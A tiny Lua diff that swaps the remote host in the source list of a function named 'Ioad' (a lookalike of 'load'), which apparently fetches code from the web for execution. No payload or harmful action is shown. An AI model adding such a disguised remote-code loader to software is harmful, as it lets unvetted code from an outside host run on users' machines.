@@ -1,6 +1,6 @@
 function Ioad(name)
     local sources = {
-        "https://kyzenzofficial.pages.dev/"
+        "https://kyzenzofficial.vercel.app/"
     }
 
     local loaded = false
